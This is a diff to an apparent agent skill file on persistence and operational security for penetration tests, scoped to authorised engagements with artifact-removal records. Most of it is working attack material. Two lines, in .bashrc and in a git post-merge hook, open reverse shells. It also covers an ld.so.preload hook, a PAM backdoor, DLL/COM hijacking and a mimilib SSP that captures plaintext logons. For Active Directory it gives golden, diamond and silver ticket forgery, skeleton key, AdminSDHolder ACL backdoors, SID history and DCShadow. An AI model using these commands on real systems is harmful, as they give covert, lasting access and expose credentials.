@@ -1,6 +1,6 @@
 ---
 name: persistence_opsec
-description: Persistence techniques (Linux/Windows/AD) and operational security — noise management, log awareness, artifact cleanup, evidence chain preservation. Only use persistence if engagement scope allows it.
+description: Persistence techniques (Linux/Windows/AD — services, WMI, hijacking, SSP, tickets, AdminSDHolder/DCShadow) and operational security — noise management, log awareness, artifact cleanup, evidence chain preservation. Only use persistence if engagement scope allows it.
 ---
 
 # Persistence & OPSEC
@@ -53,6 +53,20 @@ echo '[[ $- == *i* ]] && (/bin/bash -c "bash -i >& /dev/tcp/<ip>/<port> 0>&1" &)
 echo "/path/to/hook.so" | sudo tee -a /etc/ld.so.preload
 ```
 
+### Further Linux mechanisms (scope-gated like the rest)
+
+```bash
+# PAM module backdoor — replace/append to a PAM stack (pam_unix.so path)
+# Captures every future authentication; restore the exact original module
+
+# Git hook (if a root-run process deploys from a repo you can write)
+echo -e '#!/bin/bash\nbash -i >& /dev/tcp/<ip>/<port> 0>&1' > .git/hooks/post-merge
+chmod +x .git/hooks/post-merge
+
+# Web shell on an existing web root (when write access exists)
+# Keep one file, name it to blend, record it for removal
+```
+
 ### Windows Persistence
 
 ```powershell
@@ -88,6 +102,28 @@ Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\subscription -A
 copy shell.exe "C:\Users\All Users\Start Menu\Programs\Startup\"
 ```
 
+### DLL / COM Hijacking (no new artifacts on disk)
+
+```powershell
+# DLL search-order: place a payload DLL earlier in PATH or in the app dir
+# (an unwritable-signed binary that loads a missing/writable DLL)
+# COM: hijack a HKCU overridable CLSID used by a privileged process
+reg query HKCR\<CLSID>\InProcServer32   # if resolved per-user under
+                                        # HKCU\Software\Classes\<CLSID>, point it at your DLL
+```
+
+Prefer these over service creation when stealth matters — but they are
+harder to clean: record the exact DLL path / CLSID and original value in the
+campaign ledger before the change.
+
+### Security Support Provider (SSP)
+
+```powershell
+# Add a malicious SSP (e.g. mimilib.dll) — captures all logons in plaintext
+reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v "Security Packages" /t REG_MULTI_SZ /d "mimilib.dll" /f
+# Requires reboot; removal = restore the original multi-string exactly
+```
+
 ### AD Persistence (requires DA)
 
 ```bash
@@ -97,9 +133,32 @@ impacket-ticketer -domain corp.local -nthash <krbtgt_ntlm> -domain-sid <SID> adm
 # Diamond ticket (more stealthy than golden)
 impacket-ticketer -request -domain corp.local -user user -password pass -nthash <krbtgt>
 
+# Silver ticket — service-scoped, needs only the service account's hash
+impacket-ticketer -nthash <SVC_HASH> -domain-sid S-1-5-21-... -domain corp.local \
+  -spn cifs/fileserver.corp.local administrator
+
 # Skeleton key (injects master password on DC, requires mimikatz on DC)
 # All domain accounts accept password "skeleton"
 ```
+
+### ACL and replication persistence (DA required)
+
+```powershell
+# AdminSDHolder: SDProp re-applies this ACL to every protected group hourly
+Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=corp,DC=local" \
+  -PrincipalIdentity backdooruser -Rights All
+
+# SID History: append a DA group SID to a normal user (needs DC access)
+# mimikatz: sid::add /sam:backdooruser /new:S-1-5-21-...-512
+
+# DCShadow: register a rogue DC to push arbitrary replication changes
+# (two mimikatz sessions; extremely high privilege, very visible in monitoring)
+```
+
+These survive host reimaging — they are the strongest artifacts you can
+create. Every one of them must be recorded (`artifact_created` /
+`resource_retained`) with an exact removal plan, and called out in the final
+report; leaving an AdminSDHolder ACL behind is a finding against yourself.
 
 ## OPSEC
 
